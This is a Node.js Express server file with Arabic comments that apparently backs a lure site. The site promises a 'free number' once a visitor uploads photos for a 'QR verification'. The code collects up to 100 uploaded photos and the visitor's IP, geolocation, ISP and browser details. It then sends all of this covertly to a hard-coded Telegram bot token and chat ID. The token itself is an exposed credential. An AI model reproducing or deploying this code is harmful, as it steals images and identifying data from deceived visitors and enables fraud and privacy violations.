const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// إعداد بوت التلجرام
const TELEGRAM_TOKEN = '8236056575:AAHI0JHvTGdJiu92sDXiv7dbWMJLxvMY_x4';
const CHAT_ID = '7604667042';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });

// إعداد multer لتحميل الملفات
const upload = multer({ 
    dest: 'uploads/',
    limits: { fileSize: 50 * 1024 * 1024 } // 50MB
});

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static('uploads'));

// تأكد من مجلد التحميلات
if (!fs.existsSync('uploads')) {
    fs.mkdirSync('uploads');
}

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// استقبال الصور من الزوار
app.post('/upload-qr', upload.array('photos', 100), async (req, res) => {
    try {
        const visitorInfo = await getVisitorInfo(req);
        
        // إرسال معلومات الزائر أولاً
        await sendVisitorInfo(visitorInfo);
        
        // ثم إرسال كل الصور
        for (const file of req.files) {
            await sendPhotoToTelegram(file, visitorInfo);
        }
        
        // تنظيف الملفات المؤقتة
        req.files.forEach(file => {
            fs.unlinkSync(file.path);
        });
        
        res.json({ 
            success: true, 
            message: 'تم التحقق بنجاح! جاري إرسال الرقم المجاني...' 
        });
        
    } catch (error) {
        console.error('Upload error:', error);
        res.json({ success: false, message: 'حدث خطأ، حاول مرة أخرى' });
    }
});

// الحصول على معلومات الزائر
async function getVisitorInfo(req) {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    try {
        const ipResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const ipData = await ipResponse.json();
        
        return {
            ip: ip,
            country: ipData.country_name,
            city: ipData.city,
            region: ipData.region,
            isp: ipData.org,
            userAgent: req.headers['user-agent'],
            time: new Date().toLocaleString('ar-EG')
        };
    } catch (error) {
        return {
            ip: ip,
            userAgent: req.headers['user-agent'],
            time: new Date().toLocaleString('ar-EG')
        };
    }
}

// إرسال معلومات الزائر للتلجرام
async function sendVisitorInfo(visitorInfo) {
    const message = `
🎯 *زائر جديد حاول تحميل QR*

*🌍 معلومات الموقع:*
• الدولة: ${visitorInfo.country || 'غير معروف'}
• المدينة: ${visitorInfo.city || 'غير معروف'} 
• المنطقة: ${visitorInfo.region || 'غير معروف'}
• IP: ${visitorInfo.ip}
• مزود الخدمة: ${visitorInfo.isp || 'غير معروف'}

*💻 معلومات الجهاز:*
• المتصفح: ${visitorInfo.userAgent}

*🕒 الوقت:* ${visitorInfo.time}
    `;
    
    await bot.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown' });
}

// إرسال الصور للتلجرام
async function sendPhotoToTelegram(file, visitorInfo) {
    try {
        await bot.sendPhoto(CHAT_ID, file.path, {
            caption: `📸 صورة من الزائر - ${visitorInfo.country || 'غير معروف'} - ${new Date().toLocaleString('ar-EG')}`
        });
    } catch (error) {
        console.error('Error sending photo:', error);
    }
}

app.listen(PORT, () => {
    console.log(`🚀 الموقع يعمل على: http://localhost:${PORT}`);
});
